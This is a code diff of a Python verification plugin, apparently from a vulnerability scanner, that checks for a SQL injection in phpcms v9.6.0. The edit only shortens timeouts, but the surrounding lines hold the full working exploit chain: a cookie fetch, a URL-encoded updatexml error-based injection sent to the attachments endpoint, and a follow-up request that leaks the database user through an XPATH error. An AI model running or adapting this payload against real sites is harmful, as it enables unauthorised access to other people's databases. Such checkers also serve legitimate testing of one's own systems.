@@ -23,7 +23,7 @@ class phpcms_v96_sqli_BaseVerify:
         url_prefix = self.url + "/index.php?m=wap&c=index&a=init&siteid=1"
         tmp_cookie = {}
         try:
-            req = requests.get(url_prefix, headers=headers, timeout=10, verify=False)
+            req = requests.get(url_prefix, headers=headers, timeout=3, verify=False)
             for cookie in req.cookies:
                 tmp_cookie = cookie.value
         except:
@@ -33,7 +33,7 @@ class phpcms_v96_sqli_BaseVerify:
         }
         url_suffix = self.url + "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26"
         try:
-            req2 = requests.post(url_suffix, data=post_data, headers=headers, timeout=10, verify=False)
+            req2 = requests.post(url_suffix, data=post_data, headers=headers, timeout=3, verify=False)
             for cookie in req2.cookies:
                 tmp_cookie = cookie.value
         except:
@@ -41,7 +41,7 @@ class phpcms_v96_sqli_BaseVerify:
         
         vulnurl = self.url + "/index.php?m=content&c=down&a_k="+str(tmp_cookie)
         try:
-            req3 = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
+            req3 = requests.get(vulnurl, headers=headers, timeout=3, verify=False)
             if r"XPATH syntax error" in req3.text:
                 cprint("[+]存在phpcms v9.6.0 SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
                 return True, vulnurl, "phpcms v9.6.0 SQL注入", str(post_data), req3.text
